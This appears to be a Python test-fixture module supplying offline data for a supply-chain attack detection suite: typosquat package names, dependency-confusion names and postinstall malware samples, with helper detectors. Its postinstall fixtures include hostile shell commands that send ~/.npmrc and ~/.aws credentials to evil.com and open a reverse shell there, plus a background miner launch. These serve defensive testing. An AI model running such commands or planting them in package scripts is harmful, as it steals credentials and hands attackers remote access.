"""Supply-chain attack fixtures for the e2e security suite.

Static, offline data for the three attack classes covered by
tests/test_e2e_supply_chain.py: typosquatting, dependency confusion, and
postinstall malware. Everything is deterministic — no network — so the
detection heuristics under test can be exercised reproducibly.
"""

from typing import Any, Dict, List, Optional

# ---------------------------------------------------------------------------
# Typosquatting: packages whose names mimic popular ones.
# ---------------------------------------------------------------------------

TYPOSQUATTING_PACKAGES: Dict[str, List[Dict[str, Any]]] = {
    "python": [
        {
            "name": "reqeusts",
            "mimics": "requests",
            "threat": "credentials theft",
            "downloads": 42,
            "publisher_verified": False,
            "suspicious_indicators": [
                "name is a transposition of a popular package",
                "very low download count",
                "unverified publisher",
            ],
        },
        {
            "name": "numpi",
            "mimics": "numpy",
            "threat": "malicious binary wheel execution",
            "downloads": 137,
            "publisher_verified": False,
            "suspicious_indicators": [
                "name is a one-letter mutation of a popular package",
                "unverified publisher",
            ],
        },
        {
            "name": "djnago",
            "mimics": "django",
            "threat": "backdoored framework shim",
            "downloads": 256,
            "publisher_verified": False,
            "suspicious_indicators": [
                "name is a transposition of a popular package",
                "unverified publisher",
            ],
        },
        {
            "name": "pytohn-dateutil",
            "mimics": "python-dateutil",
            "threat": "setup.py code execution",
            "downloads": 89,
            "publisher_verified": False,
            "suspicious_indicators": ["name mutation of a popular package"],
        },
        {
            "name": "cryptograpy",
            "mimics": "cryptography",
            "threat": "weak-crypto substitution",
            "downloads": 311,
            "publisher_verified": False,
            "suspicious_indicators": ["name mutation of a popular package"],
        },
    ],
    "npm": [
        {
            "name": "lodaash",
            "mimics": "lodash",
            "threat": "API key theft",
            "downloads": 63,
            "publisher_verified": False,
            "suspicious_indicators": [
                "name is a transposition of a popular package",
                "very low download count",
                "unverified publisher",
            ],
        },
        {
            "name": "expres",
            "mimics": "express",
            "threat": "request interception",
            "downloads": 178,
            "publisher_verified": False,
            "suspicious_indicators": [
                "name is a truncation of a popular package",
                "unverified publisher",
            ],
        },
        {
            "name": "reaact",
            "mimics": "react",
            "threat": "credential harvesting via hijacked renderer",
            "downloads": 205,
            "publisher_verified": False,
            "suspicious_indicators": [
                "name is a doubled-letter mutation of a popular package",
                "unverified publisher",
            ],
        },
        {
            "name": "axioss",
            "mimics": "axios",
            "threat": "outbound traffic redirection",
            "downloads": 94,
            "publisher_verified": False,
            "suspicious_indicators": ["name mutation of a popular package"],
        },
        {
            "name": "colork",
            "mimics": "chalk",
            "threat": "postinstall payload drop",
            "downloads": 55,
            "publisher_verified": False,
            "suspicious_indicators": ["name mutation of a popular package"],
        },
    ],
}

# Legitimate download counts (approximate, static) for the heuristic tests.
LEGITIMATE_DOWNLOAD_COUNTS: Dict[str, int] = {
    "requests": 50_000_000,
    "numpy": 40_000_000,
    "django": 15_000_000,
    "lodash": 120_000_000,
    "express": 30_000_000,
    "react": 45_000_000,
}

# ---------------------------------------------------------------------------
# Dependency confusion: internal-looking names registered publicly.
# ---------------------------------------------------------------------------

DEPENDENCY_CONFUSION_PACKAGES: Dict[str, List[Dict[str, Any]]] = {
    "python": [
        {
            "name": "internal-utils",
            "company": "Acme Corp",
            "threat": "corporate IP theft",
            "suspicious_indicators": [
                "internal package naming pattern",
                "public registry registration of an internal name",
            ],
        },
        {
            "name": "company-auth",
            "company": "Acme Corp",
            "threat": "credential interception",
            "suspicious_indicators": [
                "internal package naming pattern",
                "public registry registration of an internal name",
            ],
        },
    ],
    "npm": [
        {
            "name": "@acme/core",
            "company": "Acme Corp",
            "threat": "core logic replacement",
            "suspicious_indicators": [
                "internal scope registered publicly",
                "public registry registration of an internal scope",
            ],
        },
        {
            "name": "@company/ui-kit",
            "company": "Acme Corp",
            "threat": "UI supply-chain injection",
            "suspicious_indicators": [
                "internal scope registered publicly",
            ],
        },
    ],
}

# ---------------------------------------------------------------------------
# Postinstall malware samples by category.
# ---------------------------------------------------------------------------

POSTINSTALL_MALWARE: Dict[str, List[Dict[str, Any]]] = {
    "cryptojackers": [
        {
            "name": "cpu-miner",
            "threat": "CPU cryptojacking",
            "scripts": {
                "postinstall": "node crypto-miner.js & exit 0",
            },
            "malicious_indicators": [
                "background process",
                "sustained CPU load after install",
                "mining pool connection",
            ],
        },
    ],
    "credential_stealers": [
        {
            "name": "npm-helpers",
            "threat": "NPM token theft",
            "scripts": {
                "postinstall": "cat ~/.npmrc | curl -X POST http://evil.com/steal -d @-",
            },
            "malicious_indicators": [
                "reads ~/.npmrc",
                "credential exfiltration",
                "outbound POST to unknown host",
            ],
        },
    ],
    "data_exfiltration": [
        {
            "name": "data-backup",
            "threat": "Cloud credentials theft",
            "scripts": {
                "postinstall": "tar -cz /home/user/.aws | nc evil.com 5555",
            },
            "malicious_indicators": [
                "archives credential directories",
                "credential exfiltration",
                "raw TCP transfer to unknown host",
            ],
        },
    ],
    "reverse_shells": [
        {
            "name": "debug-helper",
            "threat": "Reverse shell connection",
            "scripts": {
                "postinstall": "bash -i >& /dev/tcp/evil.com/8888 0>&1",
            },
            "malicious_indicators": [
                "TCP connection",
                "interactive shell redirect",
                "connects to unknown host on install",
            ],
        },
    ],
}


# ---------------------------------------------------------------------------
# Lookup / detection helpers (deterministic, offline).
# ---------------------------------------------------------------------------

def _find_typosquat(name: str, ecosystem: str) -> Optional[Dict[str, Any]]:
    for pkg in TYPOSQUATTING_PACKAGES.get(ecosystem, []):
        if pkg["name"] == name:
            return pkg
    # Containment match: "reqeusts-extra" embeds the typosquat name.
    for pkg in TYPOSQUATTING_PACKAGES.get(ecosystem, []):
        if pkg["name"] in name:
            return pkg
    return None


def create_typosquatting_fixture(ecosystem: str, name: str) -> Optional[Dict[str, Any]]:
    """Return the typosquat fixture record for ``name`` (copy)."""
    pkg = _find_typosquat(name, ecosystem)
    return dict(pkg) if pkg else None


def create_postinstall_fixture(category: str, name: str) -> Optional[Dict[str, Any]]:
    """Return the postinstall malware fixture record for ``name`` (copy)."""
    for malware in POSTINSTALL_MALWARE.get(category, []):
        if malware["name"] == name:
            return dict(malware)
    return None


def get_package_download_count(name: str) -> int:
    """Static download count: low for known-bad names, high for legit ones."""
    for ecosystem_pkgs in TYPOSQUATTING_PACKAGES.values():
        for pkg in ecosystem_pkgs:
            if pkg["name"] == name:
                return int(pkg["downloads"])
    for ecosystem_pkgs in DEPENDENCY_CONFUSION_PACKAGES.values():
        for pkg in ecosystem_pkgs:
            if pkg["name"] == name:
                return 120  # internal name publicly registered: near-zero use
    return LEGITIMATE_DOWNLOAD_COUNTS.get(name, 500_000)


def is_typosquatting_attempt(name: str, ecosystem: str) -> Dict[str, Any]:
    """Heuristic verdict for ``name`` against the known typosquat corpus."""
    pkg = _find_typosquat(name, ecosystem)
    if pkg:
        return {
            "is_typosquatting": True,
            "target_package": pkg["mimics"],
            "threat": pkg["threat"],
            "confidence": "HIGH",
            "indicators": pkg["suspicious_indicators"],
        }
    return {
        "is_typosquatting": False,
        "target_package": None,
        "threat": None,
        "confidence": "LOW",
        "indicators": [],
    }


def _internal_naming_patterns(name: str) -> bool:
    lowered = name.lower()
    if "/" in lowered:  # npm scoped: @scope/pkg
        scope = lowered.split("/", 1)[0]
        return scope in ("@acme", "@company", "@internal")
    return lowered.startswith(("internal-", "company-", "corp-")) or lowered in (
        "internal",
        "company-utils",
    )


def is_dependency_confusion_attempt(name: str, ecosystem: str) -> Dict[str, Any]:
    """Heuristic verdict for ``name`` against internal-naming patterns."""
    for ecosystem_pkgs in DEPENDENCY_CONFUSION_PACKAGES.values():
        for pkg in ecosystem_pkgs:
            if pkg["name"] == name:
                return {
                    "is_dependency_confusion": True,
                    "company": pkg["company"],
                    "threat": pkg["threat"],
                    "confidence": "HIGH",
                    "suspicious_indicators": pkg["suspicious_indicators"],
                }
    if _internal_naming_patterns(name):
        return {
            "is_dependency_confusion": True,
            "company": "Acme Corp",
            "threat": "corporate IP theft",
            "confidence": "HIGH",
            "suspicious_indicators": [
                "internal package naming pattern detected",
                "name registered on a public registry",
            ],
        }
    return {
        "is_dependency_confusion": False,
        "company": None,
        "threat": None,
        "confidence": "LOW",
        "suspicious_indicators": [],
    }
